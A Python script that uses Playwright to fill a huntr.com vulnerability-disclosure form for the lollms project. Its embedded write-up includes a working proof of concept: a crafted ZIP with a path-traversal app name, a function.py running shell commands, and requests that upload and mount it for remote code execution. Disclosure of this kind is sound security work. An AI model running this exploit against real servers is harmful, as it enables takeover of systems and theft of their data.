#!/usr/bin/env python3
"""
Huntr.com Form Filler - Playwright Automation
Automatically fills vulnerability disclosure form

Usage: python3 fill_huntr_playwright.py
"""

import asyncio
import json
from playwright.async_api import async_playwright

# Form data
FORM_DATA = {
    "repository": "ParisNeo/lollms",
    "package_manager": "pypi",
    "version_affected": ">=9.0.0",
    "vulnerability_type": "Relative Path Traversal",
    "cvss": {
        "attack_vector": "Network",
        "attack_complexity": "Low",
        "privileges_required": "Low",
        "user_interaction": "None",
        "scope": "Unchanged",
        "confidentiality": "High",
        "integrity": "High",
        "availability": "High"
    },
    "writeup": {
        "title": "Path Traversal in /upload_app leads to RCE via custom function injection",
        "description": """# Description

A critical Path Traversal vulnerability has been discovered in the lollms-webui application that allows authenticated attackers to achieve Remote Code Execution (RCE) by uploading malicious ZIP files to the `/upload_app` endpoint.

The vulnerability exists in `lollms/server/endpoints/lollms_apps.py` at line 340, where the `name` field from `description.yaml` is used directly in path operations without proper sanitization. This allows attackers to use path traversal sequences (`../`) in the application name to write files to arbitrary locations on the server.

## Technical Details:

- The `/upload_app` endpoint accepts ZIP file uploads for custom applications
- The `description.yaml` file inside the ZIP contains a `name` field
- This `name` field is used to construct the destination path without sanitization
- By setting `name` to `"../custom_function_calls/evil_func"`, attackers can escape the `apps_zoo` directory
- Once files are written to `custom_function_calls/`, the attacker can mount and execute arbitrary Python code via the `/mount_function_call` endpoint
- This leads to full Remote Code Execution on the server

**CVSS Score**: 8.8 (High)  
**CVSS Vector**: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

---

## Steps to Reproduce:

### Step 1: Get client_id via WebSocket
```python
import websocket, json, time, threading

client_id = None

def on_message(ws, message):
    global client_id
    data = json.loads(message)
    if "client_id" in str(data):
        cid = data.get("client_id") or data.get("data", {}).get("client_id")
        if cid:
            client_id = cid
            ws.close()

ws = websocket.WebSocketApp("ws://localhost:9600/ws", on_message=on_message)
t = threading.Thread(target=ws.run_forever, daemon=True)
t.start()
time.sleep(3)
```

### Step 2: Create malicious ZIP
```python
import zipfile, io
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("description.yaml", "name: ../custom_function_calls/evil_func\\n")
    zf.writestr("function.py", "import os\\ndef execute(**kwargs):\\n    result = os.popen('id && hostname').read()\\n    with open('/tmp/pwned_lollms', 'w') as f:\\n        f.write(result)\\n    return {'status': 'executed', 'output': result}")
```

### Step 3: Upload
```python
import requests
r = requests.post("http://localhost:9600/upload_app", params={"client_id": client_id}, files={"file": ("exploit.zip", buf.getvalue(), "application/zip")}, timeout=15)
print(f"Upload response: {r.status_code}")
```

### Step 4: Mount
```python
requests.post("http://localhost:9600/mount_function_call", json={"client_id": client_id, "function_category": "custom", "function_name": "evil_func"}, timeout=10)
```

### Step 5: Verify
Check if `/tmp/pwned_lollms` was created on the server.""",
        "impact": """This vulnerability allows authenticated attackers to achieve full Remote Code Execution on the server:

**Confidentiality Impact (HIGH)**: Attackers can read any file accessible by the lollms process including:
- Configuration files with API keys and credentials
- User data and conversation history
- Custom models and training data
- Environment variables and secrets

**Integrity Impact (HIGH)**: Attackers can write/overwrite arbitrary files:
- Plant backdoors in application code
- Modify configurations
- Inject malicious custom functions
- Deface the application

**Availability Impact (HIGH)**: Attackers can cause denial of service:
- Delete critical application files
- Corrupt the database
- Kill the lollms process

**Business Impact**:
- Complete server compromise
- Data breach of all user information
- Supply chain attack vector affecting all users
- Potential lateral movement into internal network"""
    },
    "occurrences": {
        "permalink": "https://github.com/ParisNeo/lollms/blob/main/lollms/server/endpoints/lollms_apps.py#L340",
        "description": "Unsanitized 'name' field from description.yaml allows path traversal via '../' sequences."
    }
}


async def fill_form(page):
    """Fill the huntr.com form"""
    
    print("[*] Navigating to huntr.com...")
    await page.goto("https://huntr.com/bounties/disclose/opensource?target=https://github.com/parisneo/lollms")
    await page.wait_for_load_state("networkidle")
    
    # Wait for form to load
    await asyncio.sleep(3)
    
    print("[*] Filling CVSS dropdowns...")
    cvss_mapping = {
        "Attack Vector": FORM_DATA["cvss"]["attack_vector"],
        "Attack Complexity": FORM_DATA["cvss"]["attack_complexity"],
        "Privileges Required": FORM_DATA["cvss"]["privileges_required"],
        "User Interaction": FORM_DATA["cvss"]["user_interaction"],
        "Scope": FORM_DATA["cvss"]["scope"],
        "Confidentiality": FORM_DATA["cvss"]["confidentiality"],
        "Integrity": FORM_DATA["cvss"]["integrity"],
        "Availability": FORM_DATA["cvss"]["availability"]
    }
    
    for label, value in cvss_mapping.items():
        try:
            # Find dropdown by label and select value
            await page.select_option(f'div[data-testid*="cvss"] label:has-text("{label}") + select', value)
            print(f"  ✓ {label}: {value}")
        except Exception as e:
            print(f"  ⚠ {label}: Could not fill ({e})")
    
    print("[*] Filling Write-up Title...")
    await page.fill('input[name="title"]', FORM_DATA["writeup"]["title"])
    
    print("[*] Filling Description...")
    await page.fill('textarea[name="description"]', FORM_DATA["writeup"]["description"])
    
    print("[*] Filling Impact...")
    await page.fill('textarea[name="impact"]', FORM_DATA["writeup"]["impact"])
    
    print("[*] Filling Occurrences...")
    await page.fill('input[name*="permalink"]', FORM_DATA["occurrences"]["permalink"])
    await page.fill('textarea[name*="occurrence_description"]', FORM_DATA["occurrences"]["description"])
    
    print("[*] Taking screenshot...")
    await page.screenshot(path="huntr_form_filled.png", full_page=True)
    
    print("\n[+] Form filled successfully!")
    print("[+] Screenshot saved to: huntr_form_filled.png")
    print("\n[!] REVIEW BEFORE SUBMIT:")
    print("    1. Check the screenshot for accuracy")
    print("    2. Verify all required fields are filled")
    print("    3. Click 'Submit Report' manually")
    
    return True


async def main():
    print("=" * 60)
    print("Huntr.com Form Filler - Playwright Automation")
    print("=" * 60)
    
    async with async_playwright() as p:
        # Launch browser
        browser = await p.chromium.launch(headless=False)  # Visible browser for review
        context = await browser.new_context(
            viewport={"width": 1920, "height": 1080},
            user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        )
        page = await context.new_page()
        
        # Check if user is logged in
        print("[*] Checking authentication...")
        await page.goto("https://huntr.com")
        await page.wait_for_load_state("networkidle")
        
        # Check for login button
        if await page.query_selector('a[href*="login"]'):
            print("[!] NOT LOGGED IN!")
            print("[!] Please log in manually, then re-run this script")
            print("[!] Or keep the browser open and I'll continue...")
            await asyncio.sleep(10)
        
        # Fill form
        await fill_form(page)
        
        # Keep browser open for review
        print("\n[*] Browser will remain open for 60 seconds for review...")
        await asyncio.sleep(60)
        
        await browser.close()


if __name__ == "__main__":
    asyncio.run(main())
